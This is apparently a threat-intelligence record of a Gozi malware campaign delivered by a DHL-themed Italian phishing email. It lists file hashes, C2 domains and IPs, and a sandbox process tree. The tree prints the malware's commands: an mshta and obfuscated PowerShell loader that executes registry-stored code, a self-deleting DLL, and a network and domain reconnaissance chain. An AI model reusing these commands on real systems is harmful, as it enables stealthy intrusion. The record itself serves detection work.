@@ -1,0 +1,163 @@
+07.07.2022 | Gozi_ifsb | 3000 | 
+
+******************************
+
+Sender: communicationsIT@dhl.it
+Subject: Scaduto al 30-06-2022
+
+******************************
+
+.xls a7210d9c96813885238dcd4c7d6a6c08cb41220c65d7ce547ec17fde959d233e
+.dll 20351bf93e117a01a601e5fcd6b83250e42e001a81cc9bf660e3079516a30f08
+
+******************************
+
+base_path - /images/
+
+******************************
+
+C:\Windows\Explorer.EXE
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\3a9ee4bc7f3ea02691545e64d9630d68.dll,#1
+
+rundll32.exe C:\Users\Admin\AppData\Local\Temp\3a9ee4bc7f3ea02691545e64d9630d68.dll,#1
+
+mshta.exe" "about:<hta:application><script>Wl9n='wscript.shell';resizeTo(0,2);eval(new ActiveXObject(Wl9n).regread('HKCU\\\Software\\AppDataLow\\Software\\Microsoft\\E61B1840-0D02-083C-C77A-91BCEB4E55B0\\\LocalSettings'));if(!window.flag)close()</script>"
+
+powershell.exe" new-alias -name ptrvsjcf -value gp; new-alias -name ecbftq -value iex; ecbftq ([System.Text.Encoding]::ASCII.GetString((ptrvsjcf "HKCU:Software\AppDataLow\Software\Microsoft\E61B1840-0D02-083C-C77A-91BCEB4E55B0").FolderOptions))
+
+csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\wdkjuadd\wdkjuadd.cmdline"
+
+cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESFD2C.tmp" "c:\Users\Admin\AppData\Local\Temp\wdkjuadd\CSCAF228F73E1684314B2B33E2944558AE.TMP"
+PID:2380
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe
+"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /noconfig /fullpaths @"C:\Users\Admin\AppData\Local\Temp\5z11chos\5z11chos.cmdline"
+PID:3672
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\cvtres.exe /NOLOGO /READONLY /MACHINE:IX86 "/OUT:C:\Users\Admin\AppData\Local\Temp\RESFE55.tmp" "c:\Users\Admin\AppData\Local\Temp\5z11chos\CSC8DD6CD269B1E47D1B2905565197F23DF.TMP"
+PID:3384
+C:\Windows\System32\cmd.exe
+"C:\Windows\System32\cmd.exe" /C ping localhost -n 5 && del "C:\Users\Admin\AppData\Local\Temp\3a9ee4bc7f3ea02691545e64d9630d68.dll"
+PID:2900
+C:\Windows\system32\PING.EXE
+ping  localhost -n 5 
+PID:4680
+C:\Program Files\Windows Mail\WinMail.exe
+"C:\Program Files\Windows Mail\WinMail" OCInstallUserConfigOE
+PID:4400
+C:\Windows\system32\cmd.exe
+cmd /C "systeminfo.exe > C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4632
+C:\Windows\system32\systeminfo.exe
+systeminfo.exe  
+PID:1104
+C:\Windows\syswow64\cmd.exe
+"C:\Windows\syswow64\cmd.exe" /C pause dll mail, , 
+PID:1628
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:160
+C:\Windows\system32\cmd.exe
+cmd /C "net view >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:32
+C:\Windows\system32\net.exe
+net  view 
+PID:3252
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:2720
+C:\Windows\system32\cmd.exe
+cmd /C "nslookup 127.0.0.1 >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:924
+C:\Windows\system32\nslookup.exe
+nslookup  127.0.0.1 
+PID:2868
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:3032
+C:\Windows\system32\cmd.exe
+cmd /C "tasklist.exe /SVC >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:2852
+C:\Windows\system32\tasklist.exe
+tasklist.exe  /SVC 
+PID:4200
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4444
+C:\Windows\system32\cmd.exe
+cmd /C "driverquery.exe >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4500
+C:\Windows\system32\driverquery.exe
+driverquery.exe  
+PID:2212
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:3108
+C:\Windows\system32\cmd.exe
+cmd /C "reg.exe query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4852
+C:\Windows\system32\reg.exe
+reg.exe  query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" /s 
+PID:3948
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:5040
+C:\Windows\system32\cmd.exe
+cmd /C "net config workstation >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:3612
+C:\Windows\system32\net.exe
+net  config workstation 
+PID:4836
+C:\Windows\system32\net1.exe
+C:\Windows\system32\net1  config workstation 
+PID:4044
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:5084
+C:\Windows\system32\cmd.exe
+cmd /C "nltest /domain_trusts >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4896
+C:\Windows\system32\nltest.exe
+nltest  /domain_trusts 
+PID:400
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:3688
+C:\Windows\system32\cmd.exe
+cmd /C "nltest /domain_trusts /all_trusts >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4280
+C:\Windows\system32\nltest.exe
+nltest  /domain_trusts /all_trusts 
+PID:4788
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:2360
+C:\Windows\system32\cmd.exe
+cmd /C "net view /all /domain >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4536
+C:\Windows\system32\net.exe
+net  view /all /domain 
+PID:3384
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4464
+C:\Windows\system32\cmd.exe
+cmd /C "net view /all >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:3512
+C:\Windows\system32\net.exe
+net  view /all 
+PID:3840
+C:\Windows\system32\cmd.exe
+cmd /C "echo -------- >> C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:5100
+C:\Windows\system32\cmd.exe
+cmd /U /C "type C:\Users\Admin\AppData\Local\Temp\467E.bin1 > C:\Users\Admin\AppData\Local\Temp\467E.bin & del C:\Users\Admin\AppData\Local\Temp\467E.bin1"
+PID:4404
+C:\Windows\System32\RuntimeBroker.exe
+C:\Windows\System32\RuntimeBroker.exe -Embedding
+
+deohomexm.at
+79.110.52.244
+23.227.202.64
+79.110.52.164
+79.110.52.97
